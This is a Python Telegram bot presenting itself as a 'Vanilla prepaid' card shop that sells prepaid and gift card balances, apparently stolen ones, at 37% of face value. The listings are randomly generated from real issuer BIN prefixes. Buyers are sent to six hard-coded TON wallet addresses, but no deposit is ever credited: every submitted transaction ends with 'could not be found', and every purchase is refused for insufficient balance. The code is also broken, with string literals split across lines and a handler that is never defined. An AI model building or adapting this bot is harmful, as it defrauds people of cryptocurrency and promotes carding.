import os
import asyncio
import logging
import random
import string
from datetime import datetime, time
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum

from flask import Flask, jsonify, request, Response
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
WEBHOOK_BASE_URL = os.environ.get("WEBHOOK_BASE_URL", "").rstrip("/")
PORT = int(os.environ.get("PORT", 8080))

if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN environment variable is not set")

if not WEBHOOK_BASE_URL:
    raise RuntimeError("WEBHOOK_BASE_URL environment variable is not set")

app = Flask(__name__)
telegram_app = None

CARD_BINS = {
    "USD": ["435880xx", "491277xx", "511332xx", "428313xx", "520356xx", "409758xx", "525362xx", "451129xx", "434340xx", "426370xx", "411810xx", "403446xx", "533621xx", "446317xx", "457824xx", "545660xx", "432465xx", "516612xx", "484718xx", "485246xx", "402372xx", "457851xx"],
    "CAD": ["533985xx", "461126xx"],
    "AUD": ["373778xx", "377935xx", "375163xx"]
}

CAD_BINS = ["533985xx", "461126xx"]
AUD_BINS = ["373778xx", "377935xx", "375163xx"]

FILTER_BIN_MAP = {
    "vanilla": ["411810xx", "409758xx", "520356xx", "525362xx", "484718xx", "545660xx"],
    "cardbalance": ["428313xx", "432465xx", "457824xx"],
    "walmart": ["485246xx"],
    "giftcardmall": ["451129xx", "403446xx", "435880xx", "511332xx"],
    "joker": ["533985xx", "461126xx"],
    "amex": ["373778xx", "377935xx", "375163xx"]
}

class StickerType(Enum):
    NONE = ""
    RELISTED = "🔄"
    GOOGLE = "🅶"
    PAYPAL = "🅿"

DEPOSIT_ADDRESSES = [
    "UQCgPsBnvSib5rYln5vK0rNfYo__xjfk5OD-0mKU7-n1ACnT",
    "UQCCTTF03CCeyNKov1azQty5iNcNMnwH72J7pcb7MUaDKXsd",
    "UQAZjMCIT6MEMUgvKmweTySPrGqxnUrgvG5JQVUfnR-d_tke",
    "UQBwwD_2VekRaM-7_6wwltzkboxbTiYDqif40G9Tbnq76Td1",
    "UQAMBt7k1FZHvewkpB1IHMLiOMLZR63rO_NKv-fiQ0n5EGW_",
    "UQC9OvldFlHMbxKRq-6yRTm9uWv-YWFcsywHQAZz6p9dtonc"
]

user_deposit_data = {}

@dataclass
class Card:
    card_number: str
    currency: str
    amount: float
    sticker: StickerType = StickerType.NONE
    is_registered: bool = True
    is_out_of_stock: bool = False

@dataclass
class UserData:
    user_id: int
    username: str
    first_name: str
    ton_balance: float = 0.0
    usd_balance: float = 0.0
    total_deposits_ton: float = 0.0
    total_deposits_usd: float = 0.0
    last_deposit: str = "Never"
    purchase_count: int = 0
    usd_spent: float = 0.0
    purchased_cards: List[str] = field(default_factory=list)
    referrals_count: int = 0
    referred_by: str = ""
    referral_link: str = ""
    pending_deposit: Optional[Dict] = None

class CardGenerator:
    def __init__(self):
        self.cards: List[Card] = []
        self._last_update_time = None
        self._is_updating = False

    def _generate_unique_number(self, existing_numbers: set) -> str:
        while True:
            bin_list = []
            for _, bins in CARD_BINS.items():
                bin_list.extend(bins)
            selected_bin = random.choice(bin_list)
            random_suffix = ''.join(random.choices(string.digits, k=2))
            card_num = selected_bin.replace('xx', random_suffix)
            if card_num not in existing_numbers:
                return card_num

    def _get_max_amount_for_bin(self, card_number: str) -> float:
        bin_prefix = card_number[:6] + 'xx'
        if bin_prefix in CAD_BINS:
            return 150.0
        elif bin_prefix in AUD_BINS:
            return 50.0
        else:
            return 500.0

    def _get_sticker_for_amount(self, amount: float) -> StickerType:
        if amount >= 300:
            return StickerType.NONE
        rand = random.random()
        if rand < 0.65:
            return StickerType.NONE
        elif rand < 0.75:
            return StickerType.RELISTED
        elif rand < 0.83:
            return StickerType.GOOGLE
        elif rand < 0.87:
            return StickerType.PAYPAL
        else:
            return StickerType.GOOGLE

    def _get_currency_for_bin(self, card_number: str) -> str:
        bin_prefix = card_number[:6] + 'xx'
        for currency, bins in CARD_BINS.items():
            if bin_prefix in bins:
                return currency
        return "USD"

    def generate_cards(self) -> List[Card]:
        total_cards = random.randint(200, 250)
        cards = []
        existing_numbers = set()
        existing_pairs = set()
        low_amount_count = random.randint(15, 20)
        high_amount_count = random.randint(10, min(12, total_cards // 10))
        medium_amount_count = random.randint(20, 30)
        remaining = total_cards - (low_amount_count + high_amount_count + medium_amount_count)
        aud_count = 0
        max_aud_cards = 20

        def add_card(amount: float, force_high: bool = False):
            nonlocal aud_count
            while True:
                card_num = self._generate_unique_number(existing_numbers)
                if (card_num, amount) not in existing_pairs:
                    max_amt = self._get_max_amount_for_bin(card_num)
                    if amount <= max_amt:
                        if card_num[:6] + 'xx' in AUD_BINS and aud_count >= max_aud_cards:
                            continue
                        break
            existing_numbers.add(card_num)
            existing_pairs.add((card_num, amount))
            if card_num[:6] + 'xx' in AUD_BINS:
                aud_count += 1
            currency = self._get_currency_for_bin(card_num)
            sticker = StickerType.NONE if force_high else self._get_sticker_for_amount(amount)
            cards.append(Card(card_num, currency, amount, sticker))

        for _ in range(low_amount_count):
            add_card(round(random.uniform(0.01, 0.98), 2))

        for _ in range(high_amount_count):
            add_card(round(random.uniform(300, 500), 2), force_high=True)

        for _ in range(medium_amount_count):
            add_card(round(random.uniform(5, 40), 2))

        for _ in range(remaining):
            add_card(round(random.uniform(5, 40), 2))

        cards.sort(key=lambda x: x.amount, reverse=True)
        unregistered_count = int(len(cards) * 0.2)
        cards_by_amount_desc = sorted(cards, key=lambda x: x.amount, reverse=True)
        for i in range(unregistered_count):
            cards_by_amount_desc[len(cards_by_amount_desc) - 1 - i].is_registered = False
        return cards_by_amount_desc

    async def update_cards(self):
        self._is_updating = True
        self.cards = self.generate_cards()
        self._last_update_time = datetime.now()
        self._is_updating = False
        logger.info("Cards generated: %s cards", len(self.cards))

    def mark_random_cards_out_of_stock(self, percentage: float = 1.0):
        available_cards = [c for c in self.cards if not c.is_out_of_stock]
        if not available_cards:
            return 0
        count = max(1, int(len(self.cards) * percentage / 100))
        count = min(count, len(available_cards))
        selected = random.sample(available_cards, count)
        for card in selected:
            card.is_out_of_stock = True
        logger.info("Marked %s cards as OUT OF STOCK", count)
        return count

    def get_cards_paginated(self, page: int, per_page: int = 10, filter_type: str = None) -> Tuple[List[Card], int]:
        if not self.cards:
            return [], 0
        filtered_cards = self.cards.copy()
        if filter_type:
            if filter_type == "unregistered":
                filtered_cards = [c for c in filtered_cards if not c.is_registered]
            elif filter_type == "registered":
                filtered_cards = [c for c in filtered_cards if c.is_registered]
            elif filter_type in FILTER_BIN_MAP:
                allowed_bins = FILTER_BIN_MAP[filter_type]
                filtered_cards = [
                    c for c in filtered_cards
                    if any(c.card_number.startswith(bin_prefix.replace('xx', '')) for bin_prefix in allowed_bins)
                ]
        total_pages = max(1, (len(filtered_cards) + per_page - 1) // per_page)
        start = (page - 1) * per_page
        end = start + per_page
        return filtered_cards[start:end], total_pages

    def get_low_amount_cards_page(self, per_page: int = 10) -> Tuple[List[Card], int]:
        if not self.cards:
            return [], 0
        low_cards = [c for c in self.cards if c.amount < 0.99]
        total_pages = max(1, (len(low_cards) + per_page - 1) // per_page)
        return low_cards[:per_page], total_pages

class UserManager:
    def __init__(self):
        self.users: Dict[int, UserData] = {}
        self.order_counter = 20990

    def get_or_create_user(self, update: Update, referrer_id: Optional[int] = None) -> UserData:
        user = update.effective_user
        if user.id not in self.users:
            referral_link = f"https://t.me/Vanilla_cards_bot?start=ref_{user.id}"
            self.users[user.id] = UserData(
                user_id=user.id,
                username=user.username or "",
                first_name=user.first_name or "User",
                referral_link=referral_link
            )
            if referrer_id and referrer_id != user.id and referrer_id in self.users:
                self.users[user.id].referred_by = str(referrer_id)
                self.users[referrer_id].referrals_count += 1
        return self.users[user.id]

    def get_next_order_number(self) -> int:
        self.order_counter += 1
        if self.order_counter > 1000060:
            self.order_counter = 20990
        return self.order_counter

class KeyboardBuilder:
    @staticmethod
    def get_main_menu_keyboard() -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup([
            [
                InlineKeyboardButton("💳 Stock", callback_data="stock"),
                InlineKeyboardButton("📞 Contact Admin", url="https://t.me/Vanilagcm"),
                InlineKeyboardButton("🔍 Card chake", url="https://t.me/card_chaker_bot")
            ],
            [InlineKeyboardButton("🆘 Refund support", url="https://t.me/VANILAExchange")]
        ])

    @staticmethod
    def get_filters_keyboard() -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("🔐 Unregistered", callback_data="filter_unregistered"), InlineKeyboardButton("🔓 Registered", callback_data="filter_registered")],
            [InlineKeyboardButton("⚪ Vanilla", callback_data="filter_vanilla"), InlineKeyboardButton("💠 CardBalance", callback_data="filter_cardbalance")],
            [InlineKeyboardButton("☀️ Walmart", callback_data="filter_walmart"), InlineKeyboardButton("🛍️ GiftCardMall", callback_data="filter_giftcardmall")],
            [InlineKeyboardButton("🎭 Joker", callback_data="filter_joker"), InlineKeyboardButton("🟦 AMEX", callback_data="filter_amex")],
            [InlineKeyboardButton("🏠 Clear Filters", callback_data="clear_filters")]
        ])

    @staticmethod
    def get_deposit_keyboard() -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("Confirm ✅", callback_data="deposit_confirm")],
            [InlineKeyboardButton("Cancel ⛔", callback_data="deposit_cancel")]
        ])

    @staticmethod
    def get_withdraw_keyboard() -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("Confirm ✅", callback_data="withdraw_confirm")],
            [InlineKeyboardButton("Cancel ⛔", callback_data="withdraw_cancel")]
        ])

card_generator = CardGenerator()
user_manager = UserManager()
keyboard_builder = KeyboardBuilder()

def is_update_time() -> bool:
    now = datetime.now()
    return now.hour == 3 and now.minute < 10

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    referrer_id = None
    if context.args and context.args[0].startswith("ref_"):
        try:
            referrer_id = int(context.args[0][4:])
        except ValueError:
            pass

    user = user_manager.get_or_create_user(update, referrer_id)

    welcome_text = (
        f"⚡️Welcome {user.first_name} to Vanilla prepaid! ⚡️

"
        "Sell, Buy, and strike deals in seconds!!
"
        "All transactions are secure and transparent.
"
        "All types of cards are available here at best rates. Current rate is 37%"
    )
    await update.message.reply_text(welcome_text, reply_markup=keyboard_builder.get_main_menu_keyboard())

async def send_listing_page(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: List[Card], page: int, total_pages: int, filter_type: str = None):
    if not cards:
        if update.callback_query:
            await update.callback_query.edit_message_text("No cards available at the moment.")
        else:
            await update.message.reply_text("No cards available at the moment.")
        return

    user = user_manager.get_or_create_user(update)
    message_text = (
        "⚡️ Vanilla prepaid - Main Listings V2 ⚡️

"
        "Your Balance:
"
        f"💵 USD: ${user.usd_balance:.2f}
"
        f"• TON : {user.ton_balance:.6f}

"
    )

    for i, card in enumerate(cards, 1):
        message_text += f"{i}. {card.card_number} {card.currency}${card.amount:.2f} at 37%"
        if card.sticker != StickerType.NONE:
            message_text += f" {card.sticker.value}"
        message_text += "
"

    total_balance = sum(c.amount for c in cards)
    message_text += f"
Total Cards: {len(cards)} | Total Cards Balance: ${total_balance:.2f}
"
    message_text += "Legend:
🔄 = Re-listed
🅶 = Used on Google
🅿 = Used on PayPal

"
    message_text += f"Filters: {filter_type or 'None'}
"
    message_text += f"Page: {page}/{total_pages}"

    keyboard = []
    for i, card in enumerate(cards, 1):
        if card.is_out_of_stock:
            purchase_text = "⚠️ OUT OF STOCK"
            callback_data = f"outofstock_{card.card_number}"
        else:
            purchase_text = "🛒Purchase"
            callback_data = f"purchase_{card.card_number}"

        keyboard.append([
            InlineKeyboardButton(f"{i}. {card.card_number[:6]}xx", callback_data=f"card_{card.card_number}"),
            InlineKeyboardButton(purchase_text, callback_data=callback_data)
        ])

    nav_buttons = []
    if page > 1:
        nav_buttons.append(InlineKeyboardButton("◀️ Back", callback_data=f"page_{page - 1}_{filter_type or ''}"))
    if page < total_pages:
        nav_buttons.append(InlineKeyboardButton("Next ▶️", callback_data=f"page_{page + 1}_{filter_type or ''}"))
    if nav_buttons:
        keyboard.append(nav_buttons)

    keyboard.append([
        InlineKeyboardButton("💰 Deposit", callback_data="deposit"),
        InlineKeyboardButton("🔄 Refresh", callback_data=f"refresh_{page}_{filter_type or ''}"),
        InlineKeyboardButton("🔍 Filters", callback_data="show_filters")
    ])

    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        await update.callback_query.edit_message_text(message_text, reply_markup=reply_markup)
    else:
        await update.message.reply_text(message_text, reply_markup=reply_markup)

async def deposit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    selected_address = random.choice(DEPOSIT_ADDRESSES)
    user_id = update.effective_user.id
    user_deposit_data[user_id] = {
        'address': selected_address,
        'amount': None,
        'txid': None,
        'status': 'waiting'
    }

    message = (
        f"⚡ Vanilla prepaid — TON DEPOSIT ⚡

"
        f"Deposit Information: `{selected_address}`

"
        "Minimum Deposit: `15 TON`
"
        "Instructions:
"
        "1. Send your deposit to the address above.
"
        "2. Wait for 1 confirmation.
"
        "3. Your balance will update automatically.
"
        "4. Please remember to send TON only through the TON Network. ✅

"
        "⚠️ WARNING:
"
        "- Deposits below the minimum amount will not be processed.
"
        "- This address is valid only for your account. Do not share it.

"
        "⚠️ Note: This deposit session is only active for 30 minutes."
    )

    if update.callback_query:
        await update.callback_query.edit_message_text(message, reply_markup=keyboard_builder.get_deposit_keyboard(), parse_mode='Markdown')
    else:
        await update.message.reply_text(message, reply_markup=keyboard_builder.get_deposit_keyboard(), parse_mode='Markdown')

async def deposit_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("Please enter the amount.......")
    context.user_data['awaiting_deposit_amount'] = True

async def deposit_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.delete_message()
    await update.effective_chat.send_message("Deposit request has been canceled.❌
You can now create a new deposit request.✅")
    context.user_data.pop('awaiting_deposit_amount', None)
    context.user_data.pop('awaiting_txid', None)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get('awaiting_deposit_amount'):
        try:
            amount = float(update.message.text.strip())
            if amount < 15:
                await update.message.reply_text("Minimum deposit is 15 TON. Please enter the correct amount like 15, 16, 20")
                return

            user_id = update.effective_user.id
            if user_id in user_deposit_data:
                user_deposit_data[user_id]['amount'] = amount

            context.user_data['awaiting_deposit_amount'] = False
            context.user_data['awaiting_txid'] = True
            await update.message.reply_text("Submit your Txid:")

        except ValueError:
            await update.message.reply_text("Please enter a valid number")

    elif context.user_data.get('awaiting_txid'):
        txid = update.message.text.strip()
        user_id = update.effective_user.id
        user = user_manager.get_or_create_user(update)

        deposit_data = user_deposit_data.get(user_id, {})
        amount = deposit_data.get('amount', 0)
        order_number = user_manager.get_next_order_number()
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        context.user_data['awaiting_txid'] = False

        order_text = (
            f"⚡ ORDER DETAILS ⚡

"
            f"NAME: {user.first_name}
"
            f"ID: {user.user_id}
"
            f"AMOUNT: {amount} TON
"
            f"Txid: {txid}
"
            f"Order Number: {order_number}
"
            f"Stats: Waiting...
"
            f"TIME: {current_time}

"
            "NOTE: Balance will be added within 1/2 minutes. If not added, contact customer care."
        )

        keyboard = [[InlineKeyboardButton("✆ Contact", url="https://t.me/Vanilagcm")]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        message = await update.message.reply_text(order_text, reply_markup=reply_markup)
        asyncio.create_task(update_order_status(context, message.chat_id, message.message_id, order_text))

async def update_order_status(context: ContextTypes.DEFAULT_TYPE, chat_id: int, message_id: int, original_text: str):
    await asyncio.sleep(50)
    processing_text = original_text.replace("Stats: Waiting...", "Stats: Processing....")
    try:
        await context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=processing_text)
    except Exception as e:
        logger.error("Error: %s", e)

    await asyncio.sleep(55)
    failed_text = processing_text.replace("Stats: Processing....", "Stats: transaction could not be found.")
    try:
        await context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=failed_text)
    except Exception as e:
        logger.error("Error: %s", e)

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data

    if data.startswith("purchase_"):
        await query.answer("⚠ Insufficient balance, please deposit", show_alert=True)
        return

    if data.startswith("outofstock_"):
        await query.answer("Sorry, the card is out of stock ⚠", show_alert=True)
        return

    await query.answer()

    if is_update_time():
        await query.edit_message_text("The bot is currently updating, please wait")
        return

    if data.startswith("page_"):
        parts = data.split("_", 2)
        page = int(parts[1])
        filter_type = parts[2] if len(parts) > 2 and parts[2] else None
        cards, total_pages = card_generator.get_cards_paginated(page, filter_type=filter_type)
        await send_listing_page(update, context, cards, page, total_pages, filter_type)

    elif data.startswith("refresh_"):
        parts = data.split("_", 2)
        page = int(parts[1])
        filter_type = parts[2] if len(parts) > 2 and parts[2] else None
        cards, total_pages = card_generator.get_cards_paginated(page, filter_type=filter_type)
        await send_listing_page(update, context, cards, page, total_pages, filter_type)

    elif data == "stock":
        if not card_generator.cards:
            await card_generator.update_cards()
        cards, total_pages = card_generator.get_cards_paginated(1)
        if not cards:
            await query.edit_message_text("No cards available at the moment.")
            return
        await send_listing_page(update, context, cards, 1, total_pages)

    elif data == "show_filters":
        await query.edit_message_reply_markup(reply_markup=keyboard_builder.get_filters_keyboard())

    elif data.startswith("filter_"):
        filter_type = data.replace("filter_", "")
        cards, total_pages = card_generator.get_cards_paginated(1, filter_type=filter_type)
        await send_listing_page(update, context, cards, 1, total_pages, filter_type)

    elif data == "clear_filters":
        cards, total_pages = card_generator.get_cards_paginated(1)
        await send_listing_page(update, context, cards, 1, total_pages)

    elif data == "deposit":
        await deposit_command(update, context)

    elif data == "deposit_confirm":
        await deposit_confirm(update, context)

    elif data == "deposit_cancel":
        await deposit_cancel(update, context)

    elif data == "withdraw_confirm":
        user = user_manager.get_or_create_user(update)
        if user.ton_balance < 0.1:
            await query.edit_message_text("Insufficient balance")
        else:
            await query.edit_message_text("Withdrawal request submitted!")

    elif data == "withdraw_cancel":
        await query.delete_message()

    elif data.startswith("card_"):
        card_num = data.replace("card_", "")
        await query.answer(f"✅ Copied: {card_num}", show_alert=True)

async def profile_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = user_manager.get_or_create_user(update)
    profile_text = (
        f"⚡ Vanilla prepaid PROFILE ⚡

"
        f"👤 {user.first_name}
"
        f"🆔 ID: {user.user_id}
"
        f"🔹 Username: @{user.username}
"
        f"💰 TON Balance: {user.ton_balance:.10f}
"
        f"💵 USD Balance: ${user.usd_balance:.2f}

"
        f"📥 Total Deposits: {user.total_deposits_ton:.4f} TON
"
        f"🛒 Purchases: {user.purchase_count}
"
        f"👥 Referrals: {user.referrals_count}
"
        f"🔗 Referral Link: {user.referral_link}"
    )
    await update.message.reply_text(profile_text)

async def balance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = user_manager.get_or_create_user(update)
    await update.message.reply_text(f"Your balance: {user.ton_balance:.2f} TON")

async def withdraw_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = user_manager.get_or_create_user(update)
    text = f"Your balance: {user.ton_balance:.5f} TON
Withdrawal fee: 0.01%"
    await update.message.reply_text(text, reply_markup=keyboard_builder.get_withdraw_keyboard())

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Contact: https://t.me/Vanilagcm")

async def refund_rules_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Refund Policy: Contact support within 25 minutes of purchase.")

async def ref_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = user_manager.get_or_create_user(update)
    text = f"Your referral link: {user.referral_link}
Total referrals: {user.referrals_count}"
    await update.message.reply_text(text)

async def cents_listing(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_update_time():
        await update.message.reply_text("Updating, please wait")
        return
    if not card_generator.cards:
        await card_generator.update_cards()
    cards, total_pages = card_generator.get_low_amount_cards_page()
    await send_listing_page(update, context, cards, 1, total_pages, "Low Amount (<$0.99)")

async def scheduled_update(context: ContextTypes.DEFAULT_TYPE):
    await card_generator.update_cards()

async def auto_mark_out_of_stock(context: ContextTypes.DEFAULT_TYPE):
    if card_generator.cards:
        card_generator.mark_random_cards_out_of_stock(1.0)

async def post_init(app_: Application):
    global telegram_app
    telegram_app = app_
    await card_generator.update_cards()
    webhook_url = f"{WEBHOOK_BASE_URL}/telegram"
    await app_.bot.set_webhook(url=webhook_url, allowed_updates=Update.ALL_TYPES)
    logger.info("Webhook set to %s", webhook_url)

    if app_.job_queue:
        app_.job_queue.run_repeating(auto_mark_out_of_stock, interval=3600, first=3600)
        app_.job_queue.run_daily(scheduled_update, time=time(hour=3, minute=0, second=0))

@app.route("/")
def home():
    return jsonify({"status": "running", "message": "Bot is running!"})

@app.route("/health")
def health():
    return "OK", 200

@app.route("/telegram", methods=["POST"])
async def telegram_webhook():
    if telegram_app is None:
        return Response("Bot not ready", status=503)

    data = request.get_json(force=True, silent=True)
    if not data:
        return Response("Bad request", status=400)

    update = Update.de_json(data, telegram_app.bot)
    await telegram_app.process_update(update)
    return Response("OK", status=200)

async def main():
    application = Application.builder().token(BOT_TOKEN).post_init(post_init).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("listings", stock_command))
    application.add_handler(CommandHandler("cents_listing", cents_listing))
    application.add_handler(CommandHandler("profile", profile_command))
    application.add_handler(CommandHandler("balance", balance_command))
    application.add_handler(CommandHandler("withdraw", withdraw_command))
    application.add_handler(CommandHandler("deposit", deposit_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("refund_rules", refund_rules_command))
    application.add_handler(CommandHandler("ref", ref_command))

    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_handler(CallbackQueryHandler(handle_callback))

    async with application:
        await application.start()
        await asyncio.Event().wait()

if __name__ == "__main__":
    asyncio.run(main())
